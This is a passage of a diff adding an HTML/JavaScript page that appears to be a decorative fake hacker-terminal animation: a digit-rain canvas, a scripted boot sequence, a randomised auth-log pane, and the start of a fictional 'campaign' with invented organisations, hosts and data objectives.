@@ -1,0 +1,1659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>root@nexus:~#</title>
+<style>
+  :root {
+    --bg: #04070a;
+    --fg: #45e07a;
+    --bright: #d8ffe6;
+    --dim: #2b7a4b;
+    --warn: #e2a640;
+    --err: #ff6b60;
+    --line: #10301d;
+    --pane: rgba(4, 10, 6, 0.74);
+    --mono: ui-monospace, "Cascadia Mono", "Consolas", "DejaVu Sans Mono", "Courier New", monospace;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    height: 100%;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--mono);
+    overflow: hidden;
+  }
+
+  ::selection { background: #1d6b3d; color: #eafff2; }
+
+  #rain {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.8;
+    pointer-events: none;
+  }
+
+  #boot {
+    position: fixed;
+    inset: 0;
+    z-index: 30;
+    padding: 16px 22px;
+    overflow-y: auto;
+    background: rgba(4, 7, 10, 0.94);
+    font-size: 13px;
+    line-height: 1.45;
+    text-shadow: 0 0 6px rgba(69, 224, 122, 0.35);
+    scrollbar-width: none;
+  }
+
+  #boot::-webkit-scrollbar { display: none; }
+
+  #boot .ln { white-space: pre-wrap; overflow-wrap: anywhere; }
+
+  #ui {
+    position: fixed;
+    inset: 0;
+    z-index: 2;
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 430px;
+    grid-template-rows: minmax(0, 1.05fr) minmax(0, 0.8fr) minmax(0, 0.6fr) 24px;
+    grid-template-areas:
+      "main targets"
+      "main log"
+      "main task"
+      "status status";
+    gap: 6px;
+    padding: 8px;
+  }
+
+  #ui[hidden] { display: none; }
+
+  .pane {
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    min-width: 0;
+    background: var(--pane);
+    border: 1px solid var(--line);
+    border-radius: 3px;
+    overflow: hidden;
+    box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.45);
+  }
+
+  .pane.main { grid-area: main; }
+  .pane.targets { grid-area: targets; }
+  .pane.log { grid-area: log; }
+  .pane.task { grid-area: task; }
+
+  .pane-h {
+    flex: none;
+    padding: 3px 8px;
+    font-size: 11px;
+    letter-spacing: 0.4px;
+    color: var(--dim);
+    background: rgba(8, 22, 13, 0.85);
+    border-bottom: 1px solid var(--line);
+    user-select: none;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .scroll {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding: 6px 10px 8px;
+    scrollbar-width: thin;
+    scrollbar-color: #1c4a2c transparent;
+  }
+
+  .scroll::-webkit-scrollbar { width: 8px; }
+  .scroll::-webkit-scrollbar-thumb {
+    background: #1c4a2c;
+    border-radius: 4px;
+    border: 2px solid transparent;
+    background-clip: content-box;
+  }
+
+  .ln {
+    font-size: 13px;
+    line-height: 1.45;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+    min-height: 1.45em;
+  }
+
+  .prompt { color: var(--bright); white-space: pre; }
+  .cmd .prompt { color: var(--bright); }
+  .head { color: #eafff2; font-weight: 600; }
+  .ok { color: #8dffb8; }
+  .warn { color: var(--warn); }
+  .err { color: var(--err); }
+  .dim { color: var(--dim); }
+
+  .caret {
+    display: inline-block;
+    width: 0.62em;
+    height: 1.05em;
+    margin-left: 1px;
+    background: var(--fg);
+    vertical-align: -0.16em;
+    animation: blink 1.05s steps(2, start) infinite;
+  }
+
+  @keyframes blink { 50% { opacity: 0; } }
+
+  .status {
+    grid-area: status;
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    padding: 0 10px;
+    font-size: 11px;
+    letter-spacing: 0.3px;
+    color: #a9ffc7;
+    background: #0e3a22;
+    border-radius: 2px;
+    white-space: nowrap;
+    overflow: hidden;
+    user-select: none;
+  }
+
+  .status .left { color: #03150a; background: #4bd67f; padding: 1px 8px; font-weight: 700; }
+  .status .push { margin-left: auto; }
+  .status .spark { color: #2f9a56; letter-spacing: -1px; }
+
+  .trow {
+    display: grid;
+    grid-template-columns: 17ch 12ch 7ch 1fr;
+    font-size: 12px;
+    line-height: 1.7;
+    white-space: nowrap;
+  }
+
+  .trow.hdr { color: var(--dim); letter-spacing: 0.5px; }
+  .trow .tip { color: inherit; }
+  .trow .tstate { text-align: right; }
+  .trow.pending { color: #245c39; }
+  .trow.open { color: var(--warn); }
+  .trow.owned { color: var(--fg); }
+  .trow.admin { color: var(--bright); }
+  .trow .tstate.done { font-weight: 700; }
+
+  .tfoot {
+    margin-top: 8px;
+    padding-top: 6px;
+    border-top: 1px solid var(--line);
+    font-size: 11px;
+    line-height: 1.6;
+    color: var(--dim);
+    white-space: pre-wrap;
+  }
+
+  #audioChip {
+    position: fixed;
+    right: 14px;
+    bottom: 34px;
+    z-index: 40;
+    font: 11px var(--mono);
+    letter-spacing: 0.5px;
+    color: var(--dim);
+    background: rgba(4, 12, 7, 0.9);
+    border: 1px solid var(--line);
+    border-radius: 3px;
+    padding: 4px 8px;
+    cursor: pointer;
+  }
+
+  #audioChip.on { color: #d8ffe6; border-color: #2f9a56; }
+  #audioChip:hover { color: var(--bright); border-color: #3fbf72; }
+
+  #kb {
+    position: fixed;
+    left: -2000px;
+    top: 0;
+    width: 10px;
+    height: 10px;
+    opacity: 0;
+    border: 0;
+    padding: 0;
+    background: transparent;
+  }
+
+  @media (max-width: 900px) {
+    #ui {
+      grid-template-columns: minmax(0, 1fr);
+      grid-template-rows: minmax(0, 1fr) minmax(0, 0.5fr) 24px;
+      grid-template-areas: "main" "targets" "status";
+    }
+    .pane.task, .pane.log { display: none; }
+    .status { gap: 10px; }
+    .status .spark { display: none; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .caret { animation: none; }
+    #rain { opacity: 0.45; }
+  }
+</style>
+</head>
+<body>
+  <canvas id="rain"></canvas>
+
+  <div id="boot" aria-hidden="true"></div>
+
+  <div id="ui" hidden>
+    <section class="pane main">
+      <div class="pane-h" id="mainHead">0:root@nexus:~* &mdash; /dev/pts/0</div>
+      <div class="scroll" id="mainScroll"><div id="mainBody"></div></div>
+    </section>
+
+    <section class="pane targets">
+      <div class="pane-h" id="targetsHead">targets &mdash; 0/0 owned</div>
+      <div class="scroll" id="targetsScroll"><div id="targetsBody"></div></div>
+    </section>
+
+    <section class="pane log">
+      <div class="pane-h">tail -f /var/log/auth.log</div>
+      <div class="scroll" id="logScroll"><div id="logBody"></div></div>
+    </section>
+
+    <section class="pane task">
+      <div class="pane-h">job control</div>
+      <pre id="taskBody" style="margin:0;padding:8px 10px;font:12px/1.6 var(--mono);color:var(--dim);white-space:pre;overflow:hidden"></pre>
+    </section>
+
+    <div class="status">
+      <span class="left" id="stPhase">[0/8] standby</span>
+      <span id="stLoad">load 0.42 0.38 0.31</span>
+      <span id="stUp">up 0:00</span>
+      <span id="stNet">eno1 10.42.7.44</span>
+      <span class="spark" id="stSpark"></span>
+      <span class="push" id="stClock">00:00:00</span>
+    </div>
+  </div>
+
+  <button id="audioChip" type="button">AUDIO: OFF</button>
+  <input id="kb" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="terminal input">
+
+<script>
+(() => {
+  'use strict';
+
+  const $ = (id) => document.getElementById(id);
+  const MON = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  const DOW = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+  const MAX_LINES = 1600;
+  const MAX_LOG = 80;
+
+  const rnd = (a, b) => a + Math.random() * (b - a);
+  const ri = (a, b) => Math.floor(rnd(a, b + 1));
+  const pick = (a) => a[(Math.random() * a.length) | 0];
+  const padR = (s, n) => String(s).padEnd(n);
+  const padL = (s, n) => String(s).padStart(n, '0');
+  const hex = (n, up) => {
+    let s = '';
+    for (let i = 0; i < n; i++) s += '0123456789abcdef'[(Math.random() * 16) | 0];
+    return up ? s.toUpperCase() : s;
+  };
+  const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+  const b64 = (n) => Array.from({ length: n }, () => B64[(Math.random() * 64) | 0]).join('');
+  const mac = () => Array.from({ length: 6 }, () => hex(2, true)).join(':');
+  const hms = () => {
+    const d = new Date();
+    return padL(d.getHours(), 2) + ':' + padL(d.getMinutes(), 2) + ':' + padL(d.getSeconds(), 2);
+  };
+  const ctime = () => {
+    const d = new Date();
+    return DOW[d.getDay()] + ' ' + MON[d.getMonth()] + ' ' +
+      padL(d.getDate(), 2) + ' ' + hms() + ' ' + d.getFullYear();
+  };
+  const nmapDate = () => {
+    const d = new Date();
+    return d.getFullYear() + '-' + padL(d.getMonth() + 1, 2) + '-' + padL(d.getDate(), 2) +
+      ' ' + padL(d.getHours(), 2) + ':' + padL(d.getMinutes(), 2) + ' UTC';
+  };
+  const S = {
+    mode: 'boot',
+    fast: false,
+    halt: false,
+    bootSkip: false,
+    startedAt: Date.now(),
+  };
+
+  let PROMPT = 'root@nexus:~#';
+  let TARGET = { ip: '10.42.7.19', hostname: 'db01' };
+
+  /* ---------- terminal sinks ---------- */
+  function makeTerm(scrollEl, bodyEl, max) {
+    const t = {
+      lines: [],
+      sticky: true,
+      cur: null,
+      line(text, cls) {
+        const el = document.createElement('div');
+        el.className = 'ln' + (cls ? ' ' + cls : '');
+        el.textContent = text;
+        bodyEl.appendChild(el);
+        this.cur = el;
+        this.lines.push(text);
+        while (this.lines.length > max) {
+          if (!bodyEl.firstChild) break;
+          bodyEl.removeChild(bodyEl.firstChild);
+          this.lines.shift();
+        }
+        if (this.sticky && !S.fast) scrollEl.scrollTop = scrollEl.scrollHeight;
+        return el;
+      },
+      clear() {
+        bodyEl.textContent = '';
+        this.lines.length = 0;
+        this.cur = null;
+        this.sticky = true;
+        scrollEl.scrollTop = 0;
+      },
+      dump() { return this.lines.join('\n'); },
+    };
+    scrollEl.addEventListener('scroll', () => {
+      t.sticky = scrollEl.scrollHeight - scrollEl.scrollTop - scrollEl.clientHeight < 28;
+    });
+    return t;
+  }
+
+  const mainScroll = $('mainScroll');
+  const T = makeTerm(mainScroll, $('mainBody'), MAX_LINES);
+  const LOG = makeTerm($('logScroll'), $('logBody'), MAX_LOG);
+
+  /* ---------- timing ---------- */
+  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+  async function tick(ms) {
+    if (S.fast) { await null; return; }
+    let left = ms;
+    while (left > 0) {
+      if (S.fast) { await null; return; }
+      if (S.mode === 'user') { await sleep(120); continue; }
+      const step = Math.min(left, 80);
+      await sleep(step);
+      left -= step;
+    }
+  }
+
+  async function blow(ms) {
+    if (S.fast || S.bootSkip || document.hidden) { await null; return; }
+    await sleep(ms);
+  }
+
+  /* ---------- audio (opt-in, synth only) ---------- */
+  const audio = {
+    ac: null,
+    master: null,
+    on: false,
+    armed: false,
+    lastKey: 0,
+    lastBell: 0,
+
+    init() {
+      if (this.ac) return;
+      const AC = window.AudioContext || window.webkitAudioContext;
+      if (!AC) return;
+      this.ac = new AC();
+      this.master = this.ac.createGain();
+      this.master.gain.value = 0;
+      this.master.connect(this.ac.destination);
+
+      const len = Math.floor(this.ac.sampleRate * 2);
+      const buf = this.ac.createBuffer(1, len, this.ac.sampleRate);
+      const d = buf.getChannelData(0);
+      let last = 0;
+      for (let i = 0; i < len; i++) {
+        last = (last + 0.02 * (Math.random() * 2 - 1)) / 1.02;
+        d[i] = last * 3.4;
+      }
+      const src = this.ac.createBufferSource();
+      src.buffer = buf;
+      src.loop = true;
+      const lp = this.ac.createBiquadFilter();
+      lp.type = 'lowpass';
+      lp.frequency.value = 380;
+      const g = this.ac.createGain();
+      g.gain.value = 0.05;
+      src.connect(lp).connect(g).connect(this.master);
+      src.start();
+    },
+
+    enable() {
+      this.init();
+      if (!this.ac) return;
+      this.on = true;
+      this.armed = true;
+      this.ac.resume();
+      this.master.gain.setTargetAtTime(0.85, this.ac.currentTime, 0.2);
+      try { localStorage.setItem('nexus.audio', '1'); } catch (e) {}
+      chip.textContent = 'AUDIO: ON';
+      chip.classList.add('on');
+    },
+
+    disable() {
+      this.on = false;
+      this.armed = false;
+      if (this.ac) this.master.gain.setTargetAtTime(0, this.ac.currentTime, 0.08);
+      try { localStorage.setItem('nexus.audio', '0'); } catch (e) {}
+      chip.textContent = 'AUDIO: OFF';
+      chip.classList.remove('on');
+    },
+
+    key() {
+      if (!this.on || S.fast) return;
+      const now = performance.now();
+      if (now - this.lastKey < 18) return;
+      this.lastKey = now;
+      const t = this.ac.currentTime;
+      const n = Math.floor(this.ac.sampleRate * 0.012);
+      const buf = this.ac.createBuffer(1, n, this.ac.sampleRate);
+      const d = buf.getChannelData(0);
+      for (let i = 0; i < n; i++) d[i] = (Math.random() * 2 - 1) * (1 - i / n);
+      const src = this.ac.createBufferSource();
+      src.buffer = buf;
+      const bp = this.ac.createBiquadFilter();
+      bp.type = 'bandpass';
+      bp.frequency.value = 1400 + Math.random() * 1400;
+      bp.Q.value = 1.1;
+      const g = this.ac.createGain();
+      g.gain.value = 0.3;
+      src.connect(bp).connect(g).connect(this.master);
+      src.start(t);
+    },
+
+    enter() {
+      if (!this.on) return;
+      const t = this.ac.currentTime;
+      const o = this.ac.createOscillator();
+      const g = this.ac.createGain();
+      o.type = 'triangle';
+      o.frequency.setValueAtTime(210, t);
+      o.frequency.exponentialRampToValueAtTime(90, t + 0.06);
+      g.gain.setValueAtTime(0.16, t);
+      g.gain.exponentialRampToValueAtTime(0.0001, t + 0.09);
+      o.connect(g).connect(this.master);
+      o.start(t);
+      o.stop(t + 0.1);
+    },
+
+    bell() {
+      if (!this.on) return;
+      const now = performance.now();
+      if (now - this.lastBell < 700) return;
+      this.lastBell = now;
+      const t = this.ac.currentTime;
+      const o = this.ac.createOscillator();
+      const g = this.ac.createGain();
+      o.type = 'sine';
+      o.frequency.value = 880;
+      g.gain.setValueAtTime(0.0001, t);
+      g.gain.exponentialRampToValueAtTime(0.07, t + 0.012);
+      g.gain.exponentialRampToValueAtTime(0.0001, t + 0.18);
+      o.connect(g).connect(this.master);
+      o.start(t);
+      o.stop(t + 0.2);
+    },
+  };
+
+  const chip = $('audioChip');
+  try {
+    if (localStorage.getItem('nexus.audio') === '1') {
+      chip.textContent = 'AUDIO: ARMED';
+      audio.armed = true;
+    }
+  } catch (e) {}
+
+  chip.addEventListener('click', (e) => {
+    e.stopPropagation();
+    if (audio.on) audio.disable(); else audio.enable();
+  });
+
+  function armAudio(e) {
+    if (!audio.armed || audio.on) return;
+    if (e && e.target && e.target.closest && e.target.closest('#audioChip')) return;
+    audio.enable();
+  }
+
+  document.addEventListener('pointerdown', armAudio);
+  document.addEventListener('keydown', armAudio);
+
+  /* ---------- ambient rain ---------- */
+  const canvas = $('rain');
+  const ctx = canvas.getContext('2d');
+  const GLYPHS = '0123456789';
+  const FS = 18;
+  let W = 0, H = 0, cols = 0, drops = [], speeds = [];
+  const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  function resizeRain() {
+    W = canvas.width = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    cols = Math.max(0, Math.floor(W / FS));
+    drops = new Array(cols);
+    speeds = new Array(cols);
+    for (let i = 0; i < cols; i++) {
+      drops[i] = Math.random() * -H / FS;
+      speeds[i] = (reduced ? 0.15 : 0.3) + Math.random() * 0.7;
+    }
+    ctx.fillStyle = '#04070a';
+    ctx.fillRect(0, 0, W, H);
+  }
+
+  function rainFrame() {
+    if (!W || !H) return;
+    ctx.fillStyle = 'rgba(4, 7, 10, 0.07)';
+    ctx.fillRect(0, 0, W, H);
+    ctx.font = FS + 'px "Consolas", "Courier New", monospace';
+    ctx.textBaseline = 'top';
+    for (let i = 0; i < cols; i++) {
+      const x = i * FS;
+      const y = drops[i] * FS;
+      if (y > -FS && y < H) {
+        const ch = GLYPHS[(Math.random() * 10) | 0];
+        ctx.fillStyle = '#2fbf62';
+        ctx.fillText(ch, x, y);
+        ctx.fillStyle = '#0d5c2c';
+        ctx.fillText(GLYPHS[(Math.random() * 10) | 0], x, y - FS * 2);
+      }
+      drops[i] += speeds[i];
+      if (y > H && Math.random() > 0.97) {
+        drops[i] = Math.random() * -30;
+        speeds[i] = (reduced ? 0.15 : 0.3) + Math.random() * 0.7;
+      }
+    }
+  }
+
+  window.addEventListener('resize', resizeRain);
+  resizeRain();
+  setInterval(() => { if (!document.hidden) rainFrame(); }, 55);
+
+  /* ---------- boot sequence ---------- */
+  const bootEl = $('boot');
+
+  function bput(text, cls) {
+    const el = document.createElement('div');
+    el.className = 'ln' + (cls ? ' ' + cls : '');
+    el.textContent = text;
+    bootEl.appendChild(el);
+    bootEl.scrollTop = bootEl.scrollHeight;
+    return el;
+  }
+
+  async function btype(el, text, speed) {
+    for (const ch of text) {
+      el.textContent += ch;
+      if (S.fast || S.bootSkip || document.hidden) { await null; continue; }
+      await sleep(rnd(speed * 0.5, speed * 1.6));
+    }
+  }
+
+  const KERNEL = [
+    'Linux version 6.8.0-45-generic (buildd@lcy02-amd64-061) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2025',
+    'Command line: BOOT_IMAGE=/vmlinuz-6.8.0-45-generic root=UUID=9f2c4b31-71d8-4b0a-9f1c-3e5d7a11b2c4 ro quiet splash',
+    'BIOS-provided physical RAM map:',
+    'BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable',
+    'BIOS-e820: [mem 0x0000000000100000-0x000000007d5dffff] usable',
+    'ACPI: Early table checksum verification disabled',
+    'ACPI: RSDP 0x000000007E6FE014 000024 (v02 ALASKA)',
+    'ACPI: XSDT 0x000000007E6FC728 0000C4 (v01 ALASKA A M I 01072009 AMI 01000013)',
+    'No NUMA configuration found',
+    'Zone ranges: DMA [mem 0x0000000000001000-0x0000000000ffffff] DMA32 [mem 0x0000000100000000-0x000000007d5fffff] Normal empty',
+    'smpboot: Total of 12 processors activated (59902.26 BogoMIPS)',
+    'ACPI: bus type PCI registered',
+    'pci 0000:00:1f.6: [8086:1a1d] type 00 class 0x020000',
+    'e1000e 0000:00:1f.6: (PCI Express:2.5GT/s:Width x1) 38:18:4c:7a:2f:91',
+    'e1000e 0000:00:1f.6: eth0: registered PHC clock',
+    'usbcore: registered new interface driver usbfs',
+    'Bluetooth: hci0: Firmware 0x8289 init done',
+    'EXT4-fs (sda2): mounted filesystem 9f2c4b31-71d8-4b0a-9f1c-3e5d7a11b2c4 r/w with ordered data mode. Quota mode: none.',
+    'systemd[1]: systemd 255.4-1ubuntu8.6 running in system mode (+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 +PWQUALITY +P11KIT +QRENCODE +TPM2 +BZIP2 +LZ4 +XZ +ZLIB +ZSTD +BPF_FRAMEWORK -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified)',
+    'systemd[1]: Detected architecture x86-64.',
+    'systemd[1]: Hostname set to <nexus>.',
+  ];
+
+  const UNITS = [
+    ['[  OK  ] Created slice system-getty.slice - Slice /system/getty.', 'ok'],
+    ['[  OK  ] Set up automount proc-sys-fs-binfmt_misc.automount - Arbitrary Executable File Formats File System Automount Point.', ''],
+    ['[  OK  ] Finished systemd-udevd.service - Rule Manager for Kernel Devices.', ''],
+    ['[  OK  ] Started systemd-journald.service - Journal Service.', ''],
+    ['[  OK  ] Mounted dev-hugepages.mount - Huge Pages File System.', ''],
+    ['[  OK  ] Started systemd-modules-load.service - Load Kernel Modules.', ''],
+    ['         Starting systemd-random-seed.service - Load Random Seed...', 'dim'],
+    ['[  OK  ] Finished systemd-random-seed.service - Load Random Seed.', ''],
+    ['[  OK  ] Started systemd-timesyncd.service - Network Time Synchronization.', 'ok'],
+    ['[  OK  ] Started NetworkManager.service - Network Manager.', ''],
+    ['[  OK  ] Reached target network.target - Network.', ''],
+    ['         Starting ssh.service - OpenBSD Secure Shell server...', 'dim'],
+    ['[  OK  ] Started ssh.service - OpenBSD Secure Shell server.', 'ok'],
+    ['[  OK  ] Started cron.service - Regular background program processing daemon.', ''],
+    ['[  OK  ] Reached target multi-user.target - Multi-User System.', ''],
+    ['[  OK  ] Reached target graphical.target - Graphical Interface.', ''],
+  ];
+
+  async function bootRun() {
+    let kt = 0;
+    let el;
+
+    bput('American Megatrends International, LLC. (C) 2025', 'head');
+    bput('ASUS TUF GAMING B660M-PLUS WIFI  BIOS 2801', 'dim');
+    bput('');
+    await blow(240);
+    bput('Intel(R) Core(TM) i5-12400F CPU @ 2.50GHz');
+    bput('Memory Test : 16384 MB OK');
+    await blow(420);
+    bput('Detecting SATA devices ....');
+    await blow(180);
+    bput('  SATA 0 : WDS500G3X0C-00SJG0   500.1GB', 'dim');
+    bput('  SATA 1 : Not Present', 'dim');
+    bput('  NVMe 0 : SAMSUNG MZVL21T0HCLR-00B00   1024.2GB', 'dim');
+    bput('  USB    : 2 keyboards, 1 mouse', 'dim');
+    await blow(260);
+    bput('Booting from Hard Disk...', 'ok');
+    await blow(300);
+    bput('');
+    bput('GRUB 2.12-1ubuntu1  (gpt2)  /boot/grub', 'head');
+    await blow(160);
+    bput('Loading Linux 6.8.0-45-generic ...');
+    await blow(420);
+    bput('Loading initial ramdisk ...');
+    await blow(520);
+
+    for (const line of KERNEL) {
+      kt += rnd(0.01, 0.55);
+      bput('[' + kt.toFixed(6).padStart(13) + '] ' + line, 'dim');
+      await blow(rnd(18, 70));
+    }
+
+    bput('');
+    bput('fsck from util-linux 2.39.3');
+    await blow(520);
+    bput('/dev/sda2: clean, 130824/3907584 files, 1004611/15626240 blocks');
+    await blow(300);
+    bput('fsck exited with status code 0 after 1.34 seconds', 'ok');
+
+    bput('');
+    for (const [text, cls] of UNITS) {
+      kt += rnd(0.4, 1.9);
+      bput('[' + kt.toFixed(6).padStart(13) + '] ' + text, cls);
+      await blow(rnd(35, 150));
+    }
+
+    bput('');
+    bput('e1000e 0000:00:1f.6 eno1: NIC Link is Up 1000 Mbps Full Duplex, Flow Control: Rx/Tx', 'dim');
+    await blow(220);
+    bput('systemd-networkd[512]: eno1: Gained carrier');
+    bput('systemd-networkd[512]: eno1: DHCPv4 address 10.42.7.44/24, gateway 10.42.7.1 acquired');
+    await blow(420);
+
+    bput('');
+    bput('Ubuntu 22.04.5 LTS nexus tty1');
+    bput('');
+    await blow(300);
+
+    el = bput('');
+    el.textContent = 'nexus login: ';
+    await btype(el, 'root', 70);
+    await blow(260);
+    bput('Password: ');
+    await blow(1250);
+    bput('');
+    const prevLogin = new Date(Date.now() - ri(25, 180) * 60000);
+    bput('Last login: ' + DOW[prevLogin.getDay()] + ' ' + MON[prevLogin.getMonth()] + ' ' +
+      padL(prevLogin.getDate(), 2) + ' ' + padL(prevLogin.getHours(), 2) + ':' +
+      padL(prevLogin.getMinutes(), 2) + ':' + padL(prevLogin.getSeconds(), 2) +
+      ' ' + prevLogin.getFullYear() + ' from 10.42.7.12', 'dim');
+    await blow(260);
+
+    bput('');
+    bput('Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-45-generic x86_64)', 'head');
+    bput('');
+    bput(' * Documentation:  https://help.ubuntu.com', 'dim');
+    bput(' * Management:     https://landscape.canonical.com', 'dim');
+    bput(' * Support:        https://ubuntu.com/pro', 'dim');
+    bput('');
+    bput(' System information as of ' + ctime(), 'dim');
+    bput('');
+    bput('  System load:  0.24               Processes:              283', 'dim');
+    bput('  Usage of /:   62.4% of 46.03GB   Users logged in:        1', 'dim');
+    bput('  Memory usage: 8%                 IPv4 address for eno1:  10.42.7.44', 'dim');
+    bput('  Swap usage:   0%', 'dim');
+    bput('');
+    bput('3 updates can be applied immediately.', 'dim');
+    bput('');
+    await blow(700);
+
+    bootEl.style.display = 'none';
+    $('ui').hidden = false;
+    S.mode = 'auto';
+    T.line('', '');
+    focusKb();
+  }
+
+  /* ---------- job pane ---------- */
+  const taskBody = $('taskBody');
+
+  function renderJob(title, pct, rows, done) {
+    const filled = Math.round(pct * 20);
+    const bar = '\u2588'.repeat(filled) + '\u2591'.repeat(20 - filled);
+    taskBody.textContent =
+      'JOB    ' + title + '\n' +
+      'STATE  ' + (done ? 'complete' : 'running') + '\n' +
+      '[' + bar + '] ' + (pct * 100).toFixed(1) + '%\n' +
+      rows.join('\n');
+  }
+
+  function startJob(title, rowsFor, steps, interval) {
+    steps = steps || 32;
+    interval = interval || 150;
+    const h = {};
+    h.done = (async () => {
+      for (let i = 0; i <= steps; i++) {
+        const p = i / steps;
+        renderJob(title, p, rowsFor(p), i === steps);
+        if (i === steps) break;
+        if (S.fast) await null; else await sleep(interval);
+      }
+    })();
+    return h;
+  }
+
+  /* ---------- auth.log tail ---------- */
+  const LOG_TEMPLATES = [
+    (ip) => 'sshd[' + ri(20000, 32000) + ']: Invalid user ' + pick(['admin', 'oracle', 'test', 'ubuntu', 'postgres', 'git']) + ' from ' + ip + ' port ' + ri(40000, 65000) + ' ssh2',
+    (ip) => 'sshd[' + ri(20000, 32000) + ']: Failed password for invalid user ' + pick(['admin', 'oracle', 'test', 'ubuntu', 'postgres']) + ' from ' + ip + ' port ' + ri(40000, 65000) + ' ssh2',
+    (ip) => 'sshd[' + ri(20000, 32000) + ']: Accepted password for root from ' + ip + ' port ' + ri(40000, 65000) + ' ssh2',
+    (ip) => 'sshd[' + ri(20000, 32000) + ']: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)',
+    () => 'sudo:   www-data : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/id',
+    () => 'CRON[' + ri(1000, 9000) + ']: (root) CMD (/usr/local/bin/backup.sh > /dev/null 2>&1)',
+    () => 'systemd-logind[812]: New session 42 of user root.',
+    (ip) => 'sshd[' + ri(20000, 32000) + ']: Disconnected from authenticating user root ' + ip + ' port ' + ri(40000, 65000) + ' [preauth]',
+  ];
+
+  function logLine(text, cls) {
+    LOG.line(text, cls || '');
+    if (LOG.lines.length > MAX_LOG) { /* capped in makeTerm */ }
+  }
+
+  setInterval(() => {
+    if (S.mode === 'boot' && !S.fast) return;
+    const tpl = pick(LOG_TEMPLATES);
+    const ip = Math.random() < 0.5 ? TARGET.ip : '10.42.7.' + ri(2, 250);
+    const text = syslogPrefix() + ' nexus ' + tpl(ip);
+    logLine(text, /Failed|Invalid/.test(text) ? 'warn' : '');
+  }, 1400);
+
+  function syslogPrefix() {
+    const d = new Date();
+    return MON[d.getMonth()] + ' ' + padL(d.getDate(), 2) + ' ' + hms();
+  }
+
+  /* ---------- campaign engine ---------- */
+  const ORGS = [
+    ['NORTHWIND LOGISTICS', 'northwind.local'],
+    ['MERIDIAN HEALTH', 'meridian.internal'],
+    ['ATLAS FREIGHT', 'atlasfreight.corp'],
+    ['BLUERIDGE ENERGY', 'br-energy.local'],
+    ['HARBORLINE SHIPPING', 'harborline.local'],
+  ];
+
+  const OPS = ['NIGHTFALL', 'GLASSHOUSE', 'TIDEWATER', 'BLACKTHORN', 'IRONVEIL', 'SALTWATER'];
+
+  const OBJECTIVES = [
+    ['payroll_prod.sql.gz', 'HR payroll database'],
+    ['customer_pii.tar.gz', 'customer PII export'],
+    ['q3_financials.xlsx', 'Q3 financials'],
+    ['source_repo.bundle', 'source code repository'],
+    ['vault_export.kdbx', 'IT vault export'],
+  ];
+
+  const VECTORS = [
+    { kind: 'web', host: 'web-01', role: 'web' },
+    { kind: 'redis', host: 'cache-01', role: 'cache' },
+    { kind: 'git', host: 'git-01', role: 'git' },
+    { kind: 'app', host: 'app-01', role: 'app' },
+  ];
+
+  let campaign = null;
+
+  function servicesFor(role) {
+    switch (role) {
+      case 'db': return [['22', 'ssh'], ['3306', 'mysql'], ['5432', 'postgresql']];
+      case 'dc': return [['22', 'ssh'], ['53', 'domain'], ['88', 'kerberos-sec'], ['389', 'ldap'], ['445', 'microsoft-ds']];
+      case 'file': return [['22', 'ssh'], ['873', 'rsync'], ['2049', 'nfs']];
+      case 'cache': return [['22', 'ssh'], ['6379', 'redis']];
+      case 'git': return [['22', 'ssh'], ['80', 'http'], ['443', 'ssl/http']];
+      case 'app': return [['22', 'ssh'], ['8080', 'http-proxy']];
+      case 'mail': return [['22', 'ssh'], ['25', 'smtp'], ['110', 'pop3'], ['143', 'imap']];
+      default: return [['22', 'ssh'], ['80', 'http'], ['443', 'ssl/http']];
+    }
+  }
+
+  function newCampaign() {
+    const org = pick(ORGS);
+    const vec = pick(VECTORS);
+    const obj = pick(OBJECTIVES);
+    const subnet = '10.' + pick([20, 31, 44, 58, 66, 73, 81, 92]) + '.' + ri(4, 40) + '.';
+    const mk = (last, name, role) => ({ ip: subnet + last, name, role, state: 'pending', services: [] });
+    const entry = mk(ri(10, 20), vec.host, vec.role);
+    const db = mk(ri(21, 30), 'db-01', 'db');
+    const dc = mk(ri(31, 40), 'dc-01', 'dc');
+    const backup = mk(ri(41, 50), 'backup-01', 'file');
+    const mail = mk(ri(51, 60), 'mail-01', 'mail');
+
+    campaign = {
+      org: org[0],
+      domain: org[1],
+      op: pick(OPS),
+      objective: obj[0],
+      objectiveLabel: obj[1],
+      vector: vec.kind,
+      subnet: subnet,
+      entry: entry,
+      db: db,
+      dc: dc,
+      backup: backup,
+      mail: mail,
+      hosts: [entry, db, dc, backup, mail],
+      user: 'www-data',
